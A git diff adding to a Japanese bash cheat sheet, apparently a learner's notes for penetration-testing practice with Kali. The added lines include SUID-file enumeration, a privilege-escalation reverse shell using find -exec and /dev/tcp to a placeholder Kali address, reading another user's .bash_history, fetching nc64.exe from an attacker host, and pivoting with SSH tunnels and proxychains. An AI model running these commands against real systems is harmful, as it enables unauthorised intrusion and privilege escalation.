@@ -1,5 +1,13 @@
 # ubuntu bash
 
+* ファイル指定
+
+``` shell
+  # 便利
+  # $(which XXX)
+  cp $(which find) /tmp/find
+```
+
 * パスワード変更
 
     ```shell
@@ -11,6 +19,31 @@
   ``` shell
     id
   ```
+
+* sudo
+  
+    ``` shell
+      #sudoの情報表示
+      sudo -l
+    ```
+
+* find
+
+``` shell
+  #sudo設定のファイルを検索
+  find / -perm -4000
+  #または
+  find / -type f -perm -4000 -ls 2>/dev/null
+  #コマンド実行
+  find ~/.profile -exec /bin/bash -p -i >& /dev/tcp/<kali ip address>/4444 0>&1 \; -quit
+```
+
+* cat
+
+``` shell
+  #過去の入力情報の表示
+  cat /home/XXX/.bash_history
+```
 
 * grep
   
@@ -50,6 +83,13 @@
       wget -O /tmp/XXX http://XXX.XXX.XXX.XXX:8000/filename
   ```
 
+* curl
+
+``` shell
+    #curlでファイル転送
+    curl http://<Remote KaliのIP>:8000/nc64.exe -o nc64.exe
+```
+
 * pythonの仮想環境
   
   ``` bash
@@ -68,3 +108,41 @@
   ``` shell
     mount
   ```
+
+* xfreerdp
+
+``` shell
+  xfreerdp /u:win /p:password /v:127.0.0.1
+```
+
+* ssh
+
+``` shell
+  ssh -i /home/XXX/.ssh/id_rsa <user_name>@XXX.XXX.XXX.XXX -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+
+  # port forwarding
+  ssh -N -L <localport>:<remoteXXX.XXX.XXX.XXX>:<remote_port> <踏み台user>@<踏み台XXX.XXX.XXX.XXX.>
+  
+  # dynamic port forwarding
+  ssh -fND 127.0.0.1:8080
+  #proxy経由でターゲットへのnmapスキャン
+  proxychains nmap -top-ports=20 -sT -Pn XXX.XX.XXX.XXX
+```
+
+* cron
+
+  ``` shell
+      # 設定確認
+      cat /etc/crontab
+      #　登録
+      crontab -u <ユーザ名> -e    
+  ```
+
+* sftp
+  
+``` shell
+    # sftp -i <秘密鍵> -P 8080 <ユーザ>@localhost
+    sftp -i /home/kali/id_rsa -P 8080 testuser@localhost
+    #接続後 ファイルを自分の端末に転送
+    get /C:/Users/testuser/Desktop/Pentest/flag.txt
+```
